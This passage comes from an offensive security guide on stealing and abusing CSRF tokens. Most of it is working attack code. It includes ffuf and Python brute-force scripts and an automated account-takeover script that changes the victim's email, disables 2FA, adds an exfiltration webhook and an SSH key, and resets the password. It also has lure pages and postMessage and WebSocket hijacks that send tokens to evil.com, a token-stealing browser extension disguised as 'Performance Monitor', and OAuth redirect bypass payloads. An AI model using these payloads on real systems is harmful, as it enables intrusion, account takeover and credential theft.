          pass
      
      return results

  if __name__ == '__main__':
      url = sys.argv[1] if len(sys.argv) > 1 else 'https://target.com/api/csrf-token'
      cookie_val = sys.argv[2] if len(sys.argv) > 2 else 'SESSION_COOKIE'
      
      print(f'[*] Analyzing CSRF tokens from: {url}')
      tokens = collect_tokens(url, {'session': cookie_val}, count=50)
      
      if tokens:
          results = analyze_predictability(tokens)
          print(f'\n=== Analysis Results ===')
          print(json.dumps(results, indent=2))
          
          if results['weak']:
              print('\n[!!!] TOKEN IS WEAK - Exploitation possible!')
              for issue in results['issues']:
                  print(f'  → {issue}')
          else:
              print('\n[*] Token appears cryptographically strong')
          
          with open('token_analysis.json', 'w') as f:
              json.dump({'tokens': tokens, 'analysis': results}, f, indent=2)
          print('\n[*] Full results saved to token_analysis.json')
      else:
          print('[-] No tokens collected')
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Burp Sequencer Analysis"}
  ```bash
  # Burp Suite Sequencer for statistical token analysis

  # Step 1: Send CSRF token request to Sequencer
  # Burp → Proxy → HTTP History → Select request that returns CSRF token
  # Right-click → Send to Sequencer

  # Step 2: Configure token location
  # In Sequencer tab → Token Location Within Response
  # Configure: "Custom location"
  # Define start/end markers or regex for token extraction
  # Example regex: "csrf_token":"([a-zA-Z0-9_-]+)"

  # Step 3: Start live capture
  # Click "Start live capture"
  # Wait for 5000+ tokens to be collected
  # (Minimum 100 for basic analysis, 5000+ for thorough)

  # Step 4: Analyze results
  # Click "Analyze now"
  # Review:
  #   - Overall result (effective entropy in bits)
  #   - Character-level analysis
  #   - Bit-level analysis
  #   - FIPS tests (monobit, poker, runs, long runs)

  # Step 5: Interpretation
  # Effective entropy > 64 bits → Strong (not predictable)
  # Effective entropy 32-64 bits → Moderate (may be predictable with effort)
  # Effective entropy < 32 bits → Weak (likely predictable/brute-forceable)
  # Failed FIPS tests → Non-random generation, potentially exploitable

  # Step 6: If weak, attempt prediction
  # Export captured tokens: Right-click → Save tokens
  # Use custom scripts to identify generation algorithm
  ```
  :::
::

### Token Brute Force

::code-group
```bash [Short Token Brute Force]
# If CSRF token is short (4-8 chars), brute force is feasible

# Determine token charset and length
# Example: 6-character hex token → 16^6 = 16,777,216 possibilities

# ffuf brute force with custom wordlist generation
# Generate 6-char hex wordlist
python3 -c "
for i in range(0x000000, 0xFFFFFF+1):
    print(f'{i:06x}')
" > hex6_wordlist.txt

# Brute force with ffuf
ffuf -u https://target.com/api/update \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=VICTIM" \
  -d '{"email":"attacker@evil.com","csrf_token":"FUZZ"}' \
  -w hex6_wordlist.txt \
  -mc 200,201,204 \
  -t 100 \
  -rate 500

# Numeric token brute force (4-digit)
ffuf -u https://target.com/api/update \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=VICTIM" \
  -d '{"email":"attacker@evil.com","_token":"FUZZ"}' \
  -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt \
  -mc 200,201,204

# Token in header brute force
ffuf -u https://target.com/api/update \
  -X POST \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: FUZZ" \
  -H "Cookie: session=VICTIM" \
  -d '{"email":"attacker@evil.com"}' \
  -w /usr/share/seclists/Fuzzing/6-digits-000000-999999.txt \
  -mc 200,201,204 -t 100
```

```python [token_bruteforce.py]
#!/usr/bin/env python3
"""CSRF Token Brute Force - Parallel with rate limiting"""

import requests, sys, string, itertools
from concurrent.futures import ThreadPoolExecutor, as_completed

class TokenBruteForcer:
    def __init__(self, url, cookie, param_name='csrf_token', 
                 location='body', threads=20, rate=100):
        self.url = url
        self.session = requests.Session()
        self.session.cookies.update(cookie)
        self.param_name = param_name
        self.location = location  # 'body', 'header', 'query'
        self.threads = threads
        self.found = None
        self.count = 0
    
    def try_token(self, token):
        if self.found:
            return None
        
        self.count += 1
        if self.count % 1000 == 0:
            print(f'  Tried {self.count} tokens...', flush=True)
        
        try:
            if self.location == 'body':
                resp = self.session.post(self.url,
                    json={'email': 'test@test.com', self.param_name: token},
                    timeout=5)
            elif self.location == 'header':
                resp = self.session.post(self.url,
                    json={'email': 'test@test.com'},
                    headers={self.param_name: token},
                    timeout=5)
            elif self.location == 'query':
                resp = self.session.post(f'{self.url}?{self.param_name}={token}',
                    json={'email': 'test@test.com'},
                    timeout=5)
            
            if resp.status_code in [200, 201, 204, 302]:
                self.found = token
                return token
        except:
            pass
        return None
    
    def brute_force(self, charset, length):
        print(f'[*] Brute forcing {length}-char tokens')
        print(f'[*] Charset: {charset[:20]}... ({len(charset)} chars)')
        print(f'[*] Total combinations: {len(charset)**length:,}')
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for combo in itertools.product(charset, repeat=length):
                if self.found:
                    break
                token = ''.join(combo)
                future = executor.submit(self.try_token, token)
                futures[future] = token
            
            for future in as_completed(futures):
                if self.found:
                    print(f'\n[!!!] TOKEN FOUND: {self.found}')
                    return self.found
        
        print(f'[-] Exhausted all combinations ({self.count} tried)')
        return None

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else 'https://target.com/api/update'
    
    bf = TokenBruteForcer(
        url=url,
        cookie={'session': 'VICTIM_SESSION'},
        param_name='csrf_token',
        location='body',
        threads=30
    )
    
    # Try numeric first (fastest)
    bf.brute_force(string.digits, 4)
    if not bf.found:
        bf.brute_force(string.hexdigits[:16], 6)
```
::

## Exploitation After Token Capture

### Complete Attack Flow

::steps{level="4"}

#### Capture the Leaked CSRF Token

```bash
# Via Referer header leakage
# Check attacker server access log:
grep "Referer:" /var/log/nginx/access.log | grep -oP "csrf_token=([a-zA-Z0-9_-]+)" | tail -1

# Via CORS exploitation
# Check token collector:
cat stolen_tokens.json | jq '.[0].token'

# Via XSS extraction
# Check exfiltration endpoint:
cat /var/log/nginx/access.log | grep "/token" | grep -oP "t=([^&\s]+)" | tail -1 | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read()))"

# Via cache exploitation
# Retrieved from cached page:
curl -s https://target.com/settings.css | grep -oP 'csrf_token=([a-zA-Z0-9_-]+)'
```

#### Verify Token Validity

```bash
# Test if captured token is still valid
STOLEN_TOKEN="CAPTURED_TOKEN_HERE"

curl -X POST https://target.com/api/test-endpoint \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: $STOLEN_TOKEN" \
  -H "Cookie: session=VICTIM_SESSION" \
  -d '{"test":"verification"}' \
  -v 2>&1 | grep "HTTP/"

# If 200/201/204 → Token is valid
# If 403/401 → Token expired or invalid
```

#### Execute State-Changing Attack

```bash
# Use captured token for authenticated CSRF attack

# Change email
curl -X POST https://target.com/api/user/email \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: $STOLEN_TOKEN" \
  -H "Cookie: session=VICTIM_SESSION" \
  -d '{"email":"attacker@evil.com"}'

# Create persistent API token
curl -X POST https://target.com/api/tokens \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: $STOLEN_TOKEN" \
  -H "Cookie: session=VICTIM_SESSION" \
  -d '{"name":"backup-svc","scope":"admin:all"}'

# Escalate privileges
curl -X POST https://target.com/api/user/role \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: $STOLEN_TOKEN" \
  -H "Cookie: session=VICTIM_SESSION" \
  -d '{"role":"administrator"}'
```

#### Deliver Exploit to Victim (If Token Not Yet Captured)

```html
<!-- If you know the leakage vector but need victim interaction -->
<!-- Example: Force victim to visit page where token leaks via Referer -->

<!-- Step 1: Social engineering page with external resource -->
<!-- Host this and lure victim to visit while authenticated -->
<html>
<head><title>Important Update</title></head>
<body>
<p>Please review the updated terms.</p>
<!-- This image causes victim's browser to send Referer to your server -->
<img src="https://evil.com/collect.gif" style="display:none">
<script>
// After token is captured via Referer, use it
setTimeout(() => {
  // The token collector server can return the captured token
  fetch('https://evil.com/get-captured-token')
    .then(r => r.json())
    .then(data => {
      if (data.token) {
        // Use captured token for CSRF
        fetch('https://target.com/api/user/email', {
          method: 'POST',
          credentials: 'include',
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': data.token
          },
          body: JSON.stringify({ email: 'attacker@evil.com' })
        });
      }
    });
}, 2000);
</script>
</body>
</html>
```
::

### Automated Exploitation After Capture

::code-tree{default-value="exploit_with_token.py"}
```python [exploit_with_token.py]
#!/usr/bin/env python3
"""
Automated exploitation using captured CSRF token
Performs full account takeover chain
"""

import requests, json, sys

class CSRFExploiter:
    def __init__(self, base_url, csrf_token, session_cookie):
        self.base = base_url.rstrip('/')
        self.csrf = csrf_token
        self.session = requests.Session()
        self.session.cookies.update(session_cookie)
        self.session.headers.update({
            'Content-Type': 'application/json',
            'X-CSRF-Token': self.csrf
        })
        self.results = []
    
    def attack(self, endpoint, data, description):
        url = f'{self.base}{endpoint}'
        try:
            resp = self.session.post(url, json=data, timeout=10)
            success = resp.status_code in [200, 201, 204, 302]
            result = {
                'action': description,
                'endpoint': endpoint,
                'status': resp.status_code,
                'success': success,
                'response': resp.text[:200]
            }
            self.results.append(result)
            status = '✓' if success else '✗'
            print(f'  [{status}] {description} → HTTP {resp.status_code}')
            return success, resp
        except Exception as e:
            print(f'  [✗] {description} → Error: {e}')
            return False, None
    
    def full_takeover(self):
        print('[*] Starting full account takeover chain...\n')
        
        self.attack('/api/user/email',
            {'email': 'attacker@evil.com'},
            'Change email address')
        
        self.attack('/api/user/2fa/disable',
            {'confirm': True},
            'Disable two-factor authentication')
        
        self.attack('/api/settings/notifications',
            {'security_alerts': False, 'login_alerts': False, 'email_notifications': False},
            'Disable security notifications')
        
        success, resp = self.attack('/api/tokens',
            {'name': 'monitoring-svc', 'scope': 'admin:all', 'expires_at': None},
            'Create persistent API token')
        if success:
            try:
                token_data = resp.json()
                print(f'    → API Token: {json.dumps(token_data)}')
            except: pass
        
        self.attack('/api/webhooks',
            {'url': 'https://evil.com/exfil', 'events': ['*'], 'active': True},
            'Add data exfiltration webhook')
        
        self.attack('/api/user/keys',
            {'title': 'workstation', 'key': 'ssh-rsa AAAAB3...ATTACKER_KEY'},
            'Add SSH key')
        
        self.attack('/api/user/password',
            {'new_password': 'ATO-Complete-2024!', 'confirm': 'ATO-Complete-2024!'},
            'Change password (final lockout)')
        
        print(f'\n[*] Attack chain complete: {sum(1 for r in self.results if r["success"])}/{len(self.results)} succeeded')
        
        with open('exploitation_results.json', 'w') as f:
            json.dump(self.results, f, indent=2)
        print('[*] Results saved to exploitation_results.json')

if __name__ == '__main__':
    base = sys.argv[1] if len(sys.argv) > 1 else 'https://target.com'
    token = sys.argv[2] if len(sys.argv) > 2 else 'STOLEN_CSRF_TOKEN'
    cookie = sys.argv[3] if len(sys.argv) > 3 else 'VICTIM_SESSION'
    
    exploiter = CSRFExploiter(base, token, {'session': cookie})
    exploiter.full_takeover()
```

```bash [usage.sh]
# Use with captured CSRF token
python3 exploit_with_token.py \
  "https://target.com" \
  "CAPTURED_CSRF_TOKEN" \
  "VICTIM_SESSION_COOKIE"

# Use with token from collector server
TOKEN=$(curl -s https://evil.com/latest-token | jq -r '.token')
python3 exploit_with_token.py \
  "https://target.com" \
  "$TOKEN" \
  "VICTIM_SESSION"
```
::

## Advanced Leakage Vectors

### PostMessage Token Leakage

::tabs
  :::tabs-item{icon="i-lucide-code" label="PostMessage Interception"}
  ```html
  <!-- Applications using postMessage to share CSRF tokens between -->
  <!-- windows/iframes may leak tokens to attacker-controlled origins -->

  <!-- Scenario: Parent page sends CSRF token to embedded iframe -->
  <!-- If iframe origin is not validated, attacker can receive the token -->

  <!-- Attacker page embedded as iframe (if allowed) -->
  <html>
  <body>
  <script>
  // Listen for postMessage events containing CSRF tokens
  window.addEventListener('message', function(event) {
    // Don't check event.origin — capture from any origin
    const data = event.data;
    let token = null;
    
    if (typeof data === 'string') {
      try {
        const parsed = JSON.parse(data);
        token = parsed.csrf_token || parsed.token || parsed.csrfToken;
      } catch(e) {
        // Check if raw string is a token
        if (data.length > 16 && /^[a-zA-Z0-9_/+=.-]+$/.test(data)) {
          token = data;
        }
      }
    } else if (typeof data === 'object') {
      token = data.csrf_token || data.token || data.csrfToken || 
              data.csrf || data._token;
    }
    
    if (token) {
      console.log('[+] CSRF token received via postMessage:', token);
      console.log('[+] Origin:', event.origin);
      
      // Exfiltrate
      navigator.sendBeacon('https://evil.com/postmessage-token', JSON.stringify({
        token: token,
        origin: event.origin,
        data: JSON.stringify(data).substring(0, 500)
      }));
    }
  });
  </script>
  </body>
  </html>

  <!-- Technique 2: Open target in window and intercept postMessage -->
  <html>
  <body>
  <script>
  // Open target page that sends CSRF token via postMessage
  var targetWin = window.open('https://target.com/oauth/authorize?embed=true');
  
  window.addEventListener('message', function(event) {
    if (event.origin === 'https://target.com') {
      const token = event.data?.csrf_token || event.data?.token;
      if (token) {
        console.log('[+] Captured token from postMessage:', token);
        targetWin.close();
        
        // Perform CSRF with captured token
        fetch('https://target.com/api/user/email', {
          method: 'POST',
          credentials: 'include',
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': token
          },
          body: JSON.stringify({ email: 'attacker@evil.com' })
        });
      }
    }
  });
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="PostMessage Detection"}
  ```bash
  # Search for postMessage usage in JavaScript files
  curl -s https://target.com/static/app.js | \
    grep -iEn "(postMessage|addEventListener.*message)" | head -20

  # Check if postMessage sends CSRF tokens
  curl -s https://target.com/static/app.js | \
    grep -B5 -A5 "postMessage" | grep -iE "csrf|token|xsrf"

  # Check if origin validation exists
  curl -s https://target.com/static/app.js | \
    grep -A10 "addEventListener.*message" | \
    grep -iE "(event\.origin|origin.*===|origin.*==|checkOrigin)"

  # If NO origin check found → postMessage token leakage possible

  # Search all JS files for postMessage patterns
  find_js_files() {
    curl -s https://target.com/ | \
      grep -oP 'src="[^"]*\.js[^"]*"' | \
      sed 's/src="//;s/"//'
  }

  for js in $(find_js_files); do
    [[ ! "$js" =~ ^http ]] && js="https://target.com${js}"
    result=$(curl -s "$js" | grep -c "postMessage")
    if [ "$result" -gt 0 ]; then
      echo "[+] postMessage in: $js ($result occurrences)"
      curl -s "$js" | grep -B3 -A3 "postMessage" | head -20
    fi
  done
  ```
  :::
::

### OAuth/SSO Token Leakage

::accordion
  :::accordion-item{icon="i-lucide-log-in" label="OAuth State/CSRF Token in Redirect"}
  ```bash
  # OAuth flows often use a 'state' parameter as CSRF protection
  # If leaked, the OAuth CSRF protection is defeated

  # Check OAuth authorization URL for token exposure
  curl -sI "https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/callback&state=CSRF_TOKEN&response_type=code" | \
    grep -i "location"

  # Check if state parameter leaks in redirect chain
  curl -v -L "https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/callback&state=PROBE_TOKEN&response_type=code" \
    2>&1 | grep -iE "(location|referer).*state="

  # Check if OAuth callback page loads external resources (Referer leak)
  curl -s "https://target.com/callback?code=test&state=PROBE_TOKEN" \
    -H "Cookie: session=VALID" | \
    grep -oP 'https?://(?!target\.com)[^"'\''> ]+' | sort -u

  # Check if OAuth error page exposes state parameter
  curl -s "https://target.com/callback?error=access_denied&state=PROBE_TOKEN" | \
    grep -i "state\|PROBE_TOKEN"

  # Test open redirect in redirect_uri for state leakage
  curl -sI "https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://evil.com/steal&state=CSRF_TOKEN&response_type=code" | \
    grep -i "location"

  # If redirect_uri validation is weak:
  REDIRECT_BYPASSES=(
    "https://target.com.evil.com/callback"
    "https://target.com/callback/../../../evil.com"
    "https://target.com/callback?next=https://evil.com"
    "https://evil.com%40target.com/callback"
    "https://target.com/callback#@evil.com"
  )

  for uri in "${REDIRECT_BYPASSES[@]}"; do
    echo -n "redirect_uri=$uri → "
    curl -sI "https://target.com/oauth/authorize?client_id=APP&redirect_uri=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$uri'))")&state=TOKEN&response_type=code" | \
      grep -oP "location:\s*\K.*" || echo "blocked"
  done
  ```
  :::

  :::accordion-item{icon="i-lucide-log-in" label="SSO Token in URL Fragment/Query"}
  ```bash
  # SAML/SSO flows may expose CSRF tokens in URL parameters

  # Check SAML response for token exposure
  curl -sI "https://target.com/sso/acs" \
    -X POST \
    -d "SAMLResponse=BASE64_RESPONSE&RelayState=CSRF_TOKEN" | \
    grep -i "location"

  # Check if RelayState (often used as CSRF protection) leaks
  curl -v "https://target.com/sso/login?RelayState=CSRF_TOKEN" \
    2>&1 | grep -iE "(location|referer).*RelayState"

  # Check if SSO callback page has external resources
  curl -s "https://target.com/sso/callback?token=SSO_TOKEN&csrf=CSRF_TOKEN" \
    -H "Cookie: session=VALID" | \
    grep -oP 'https?://(?!target\.com)[^"'\''> ]+' | sort -u

  # OpenID Connect: Check if nonce parameter leaks
  curl -sI "https://target.com/auth/callback?code=AUTH_CODE&state=STATE_CSRF&nonce=NONCE" | \
    grep -i "location"
  ```
  :::

  :::accordion-item{icon="i-lucide-log-in" label="Token Leakage via OAuth Provider"}
  ```bash
  # Some OAuth providers log or expose authorization parameters

  # Check if authorization server exposes token in error
  curl -s "https://auth.provider.com/authorize?client_id=TARGET_APP&state=CSRF_TOKEN&response_type=code&redirect_uri=invalid" | \
    grep -i "state\|CSRF_TOKEN"

  # Check token leakage via OAuth provider's consent page
  # External resources on consent page receive Referer with state parameter
  curl -s "https://auth.provider.com/authorize?client_id=TARGET_APP&state=CSRF_TOKEN&response_type=code" | \
    grep -oP 'https?://(?!auth\.provider\.com)[^"'\''> ]+' | sort -u
  ```
  :::
::

### Browser Extension Token Theft

::code-collapse
```javascript
// Malicious browser extension that captures CSRF tokens
// For authorized red team / penetration testing only

// manifest.json (Manifest V3)
// {
//   "name": "Performance Monitor",
//   "version": "1.0",
//   "manifest_version": 3,
//   "permissions": ["webRequest", "cookies", "storage"],
//   "host_permissions": ["*://target.com/*"],
//   "background": { "service_worker": "background.js" },
//   "content_scripts": [{
//     "matches": ["*://target.com/*"],
//     "js": ["content.js"],
//     "run_at": "document_idle"
//   }]
// }

// === content.js ===
// Runs in the context of target.com pages
(function() {
  // Extract CSRF tokens from DOM
  const selectors = [
    'input[name*="csrf"]', 'input[name*="token"]',
    'input[name="_token"]', 'meta[name="csrf-token"]',
    '[data-csrf]'
  ];
  
  for (const sel of selectors) {
    const el = document.querySelector(sel);
    if (el) {
      const token = el.value || el.content || el.dataset.csrf;
      if (token) {
        chrome.runtime.sendMessage({
          type: 'csrf_token',
          token: token,
          url: location.href,
          source: sel
        });
      }
    }
  }
  
  // Monitor XHR/Fetch for CSRF headers
  const origOpen = XMLHttpRequest.prototype.open;
  const origSetHeader = XMLHttpRequest.prototype.setRequestHeader;
  
  XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
    if (/csrf|xsrf|token/i.test(name)) {
      chrome.runtime.sendMessage({
        type: 'csrf_header',
        header: name,
        token: value,
        url: location.href
      });
    }
    return origSetHeader.apply(this, arguments);
  };
  
  // Monitor localStorage/sessionStorage writes
  const origSetItem = Storage.prototype.setItem;
  Storage.prototype.setItem = function(key, value) {
    if (/csrf|xsrf|token/i.test(key)) {
      chrome.runtime.sendMessage({
        type: 'csrf_storage',
        key: key,
        token: value,
        storage: this === localStorage ? 'localStorage' : 'sessionStorage'
      });
    }
    return origSetItem.apply(this, arguments);
  };
})();

// === background.js ===
// Collects and exfiltrates tokens
// chrome.runtime.onMessage.addListener((msg) => {
//   if (msg.type?.startsWith('csrf')) {
//     fetch('https://evil.com/extension-exfil', {
//       method: 'POST',
//       body: JSON.stringify(msg)
//     });
//   }
// });
```
::

### WebSocket Token Leakage

::code-group
```bash [WebSocket Token Detection]
# Check if CSRF tokens are transmitted over WebSocket connections

# Monitor WebSocket traffic in Burp Suite
# Proxy → WebSocket history → Search for "csrf" "token" "_token"

# Use websocat to connect and monitor
websocat -t wss://target.com/ws \
  --header "Cookie: session=VALID" | \
  grep -iE "csrf|token|xsrf"

# Python WebSocket monitor
python3 -c "
import websocket, json

def on_message(ws, message):
    if any(k in message.lower() for k in ['csrf', 'token', 'xsrf']):
        print(f'[+] Token in WS message: {message[:200]}')

def on_open(ws):
    # Some apps send CSRF token on connection
    print('[*] WebSocket connected, monitoring...')

ws = websocket.WebSocketApp('wss://target.com/ws',
    cookie='session=VALID',
    on_message=on_message,
    on_open=on_open)
ws.run_forever()
"
```

```html [WebSocket Token Hijack]
<!-- Cross-site WebSocket Hijacking to steal CSRF tokens -->
<!-- WebSocket connections are NOT restricted by SameSite cookies -->

<html>
<body>
<script>
// Connect to target's WebSocket with victim's cookies
var ws = new WebSocket('wss://target.com/ws');

ws.onopen = function() {
  console.log('[+] WebSocket connected with victim session');
  
  // Some servers send CSRF token on connect
  // Request session info that includes CSRF token
  ws.send(JSON.stringify({
    type: 'getSession',
    action: 'getCsrfToken'
  }));
};

ws.onmessage = function(event) {
  var data = event.data;
  try {
    var parsed = JSON.parse(data);
    // Look for CSRF token in any response
    var token = parsed.csrf_token || parsed.csrfToken || 
                parsed.token || parsed._token ||
                parsed.session?.csrf || parsed.meta?.csrf;
    
    if (token) {
      console.log('[+] CSRF token from WebSocket:', token);
      
      // Exfiltrate
      navigator.sendBeacon('https://evil.com/ws-token', JSON.stringify({
        token: token,
        full_response: data.substring(0, 1000)
      }));
      
      // Use token for CSRF attack
      fetch('https://target.com/api/user/email', {
        method: 'POST',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': token
        },
        body: JSON.stringify({ email: 'attacker@evil.com' })
      });
    }
  } catch(e) {
    // Check raw message for token patterns
    var match = data.match(/(?:csrf|token)["\s:=]+([a-zA-Z0-9_/+=.-]{16,})/i);
    if (match) {
      navigator.sendBeacon('https://evil.com/ws-token', 
        JSON.stringify({ token: match[1], raw: data.substring(0, 500) }));
    }
  }
};
</script>
</body>
</html>
```
::

## Comprehensive Scanning Automation

::code-group
```bash [csrf_leak_scanner.sh]
#!/bin/bash
# Comprehensive CSRF Token Leakage Scanner
# Usage: ./csrf_leak_scanner.sh <target_url> <session_cookie>

TARGET="${1:?Usage: $0 <target_url> <session_cookie>}"
COOKIE="${2:?Provide session cookie}"
REPORT="csrf_leakage_$(date +%Y%m%d_%H%M%S).txt"

echo "=============================================" | tee "$REPORT"
echo "CSRF Token Leakage Scanner" | tee -a "$REPORT"
echo "Target: $TARGET" | tee -a "$REPORT"
echo "Date: $(date)" | tee -a "$REPORT"
echo "=============================================" | tee -a "$REPORT"

# Test 1: Token in URL parameters
echo -e "\n[*] Test 1: Token in URL Parameters" | tee -a "$REPORT"
for page in "/" "/settings" "/profile" "/account" "/dashboard" "/admin"; do
  url="${TARGET}${page}"
  resp_url=$(curl -sI "$url" -H "Cookie: $COOKIE" -L -w "%{url_effective}" -o /dev/null)
  if echo "$resp_url" | grep -qiE "(csrf|token|_token)="; then
    echo "  [!] TOKEN IN URL: $resp_url" | tee -a "$REPORT"
  fi
done

# Test 2: Cache-Control headers
echo -e "\n[*] Test 2: Cache-Control on Token Pages" | tee -a "$REPORT"
for page in "/" "/settings" "/profile" "/api/csrf-token" "/api/session"; do
  url="${TARGET}${page}"
  cache=$(curl -sI "$url" -H "Cookie: $COOKIE" | grep -i "cache-control" | head -1)
  if [ -z "$cache" ]; then
    echo "  [!] NO CACHE-CONTROL: $page" | tee -a "$REPORT"
  elif echo "$cache" | grep -qiE "public|max-age=[1-9]"; then
    echo "  [!] CACHEABLE: $page → $cache" | tee -a "$REPORT"
  fi
done

# Test 3: CORS on token endpoints
echo -e "\n[*] Test 3: CORS on Token Endpoints" | tee -a "$REPORT"
for ep in "/api/csrf-token" "/api/csrf" "/api/session" "/api/me" "/api/user"; do
  url="${TARGET}${ep}"
  acao=$(curl -sI "$url" -H "Origin: https://evil.com" -H "Cookie: $COOKIE" | \
    grep -oP "Access-Control-Allow-Origin:\s*\K.*" | tr -d '\r')
  acac=$(curl -sI "$url" -H "Origin: https://evil.com" -H "Cookie: $COOKIE" | \
    grep -oP "Access-Control-Allow-Credentials:\s*\K.*" | tr -d '\r')
  if [ -n "$acao" ]; then
    echo "  [!] CORS ENABLED: $ep → ACAO=$acao ACAC=$acac" | tee -a "$REPORT"
  fi
done

# Test 4: Referrer-Policy
echo -e "\n[*] Test 4: Referrer-Policy Headers" | tee -a "$REPORT"
ref_policy=$(curl -sI "$TARGET" | grep -oP "Referrer-Policy:\s*\K.*" | tr -d '\r')
if [ -z "$ref_policy" ]; then
  echo "  [!] NO REFERRER-POLICY HEADER (browser default: strict-origin-when-cross-origin)" | tee -a "$REPORT"
elif echo "$ref_policy" | grep -qi "unsafe-url"; then
  echo "  [!] UNSAFE REFERRER-POLICY: $ref_policy" | tee -a "$REPORT"
elif echo "$ref_policy" | grep -qi "no-referrer-when-downgrade"; then
  echo "  [!] WEAK REFERRER-POLICY: $ref_policy (leaks on HTTPS→HTTPS)" | tee -a "$REPORT"
fi

# Test 5: Token in API responses (cross-origin readable?)
echo -e "\n[*] Test 5: Token Exposure in API Responses" | tee -a "$REPORT"
for ep in "/api/csrf-token" "/api/csrf" "/api/session" "/api/me" "/api/user/profile"; do
  url="${TARGET}${ep}"
  resp=$(curl -s "$url" -H "Cookie: $COOKIE" 2>/dev/null)
  if echo "$resp" | grep -qiE "(csrf|xsrf|_token|csrfToken)"; then
    echo "  [!] TOKEN IN RESPONSE: $ep" | tee -a "$REPORT"
    echo "      $(echo "$resp" | grep -ioE '"[^"]*csrf[^"]*"\s*:\s*"[^"]*"' | head -1)" | tee -a "$REPORT"
  fi
done

# Test 6: JSONP endpoints
echo -e "\n[*] Test 6: JSONP Token Endpoints" | tee -a "$REPORT"
for ep in "/api/session" "/api/user" "/api/me" "/api/csrf"; do
  for cb in "callback" "cb" "jsonp"; do
    url="${TARGET}${ep}?${cb}=test"
    resp=$(curl -s "$url" -H "Cookie: $COOKIE")
    if echo "$resp" | grep -q "test("; then
      echo "  [!] JSONP AVAILABLE: ${ep}?${cb}=test" | tee -a "$REPORT"
      if echo "$resp" | grep -qiE "csrf|token"; then
        echo "      → Contains CSRF token data!" | tee -a "$REPORT"
      fi
    fi
  done
done

# Test 7: External resources on token pages
echo -e "\n[*] Test 7: External Resources on Token Pages" | tee -a "$REPORT"
for page in "/settings" "/profile" "/account"; do
  url="${TARGET}${page}"
  ext_count=$(curl -s "$url" -H "Cookie: $COOKIE" | \
    grep -oP 'https?://(?!'"$(echo "$TARGET" | grep -oP '//\K[^/]+')"')[^"'\''> ]+' | \
    sort -u | wc -l)
  if [ "$ext_count" -gt 0 ]; then
    echo "  [!] $page loads $ext_count external resources (potential Referer leak)" | tee -a "$REPORT"
  fi
done

echo -e "\n=============================================" | tee -a "$REPORT"
echo "[*] Scan complete. Report: $REPORT" | tee -a "$REPORT"
```

```python [csrf_leakage_analyzer.py]
#!/usr/bin/env python3
"""
Advanced CSRF Token Leakage Analyzer
Comprehensive testing across all leakage vectors
"""

import requests, re, json, sys, warnings
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

warnings.filterwarnings('ignore')

class CSRFLeakageAnalyzer:
    def __init__(self, base_url, cookies):
        self.base = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.cookies.update(cookies)
        self.session.verify = False
        self.findings = []
        self.domain = urlparse(base_url).netloc
    
    TOKEN_PATTERNS = [
        r'csrf[_-]?token["\s:=]+["\']([a-zA-Z0-9_/+=.-]{16,})["\']',
        r'_token["\s:=]+["\']([a-zA-Z0-9_/+=.-]{16,})["\']',
        r'authenticity_token["\s:=]+["\']([a-zA-Z0-9_/+=.-]{16,})["\']',
        r'csrfmiddlewaretoken["\s:=]+["\']([a-zA-Z0-9_/+=.-]{16,})["\']',
        r'X-CSRF-Token["\s:=]+["\']([a-zA-Z0-9_/+=.-]{16,})["\']',
        r'xsrf[_-]?token["\s:=]+["\']([a-zA-Z0-9_/+=.-]{16,})["\']',
    ]
    
    def add_finding(self, category, severity, description, details=''):
        finding = {
            'category': category,
            'severity': severity,
            'description': description,
            'details': details,
            'timestamp': datetime.now().isoformat()
        }
        self.findings.append(finding)
        icon = {'CRITICAL': '🔴', 'HIGH': '🟠', 'MEDIUM': '🟡', 'LOW': '🟢'}.get(severity, '⚪')
        print(f'  {icon} [{severity}] {description}')
        if details:
            print(f'     → {details[:150]}')
    
    def test_url_token_exposure(self):
        print('\n[*] Testing: Token in URL Parameters')
        pages = ['/', '/settings', '/profile', '/account', '/dashboard',
                 '/admin', '/preferences', '/security']
        
        for page in pages:
            try:
                resp = self.session.get(f'{self.base}{page}', allow_redirects=True)
                if any(p in resp.url.lower() for p in ['csrf', 'token', '_token', 'xsrf']):
                    self.add_finding('URL_EXPOSURE', 'HIGH',
                        f'CSRF token in URL: {page}', resp.url)
                
                # Check form actions with GET method
                for match in re.finditer(r'<form[^>]*method\s*=\s*["\']get["\'][^>]*action\s*=\s*["\']([^"\']*)["\']', resp.text, re.I):
                    action = match.group(1)
                    if any(p in action.lower() for p in ['csrf', 'token']):
                        self.add_finding('URL_EXPOSURE', 'HIGH',
                            f'GET form with token in action: {page}', action)
            except Exception as e:
                pass
    
    def test_cache_headers(self):
        print('\n[*] Testing: Cache-Control Headers')
        endpoints = ['/', '/settings', '/profile', '/api/csrf-token',
                     '/api/session', '/api/me', '/api/user']
        
        for ep in endpoints:
            try:
                resp = self.session.get(f'{self.base}{ep}')
                cache_control = resp.headers.get('Cache-Control', '')
                
                has_token = bool(re.search('|'.join(self.TOKEN_PATTERNS), resp.text, re.I))
                
                if has_token:
                    if not cache_control:
                        self.add_finding('CACHE_LEAK', 'HIGH',
                            f'No Cache-Control on token page: {ep}')
                    elif 'no-store' not in cache_control.lower():
                        if 'public' in cache_control.lower():
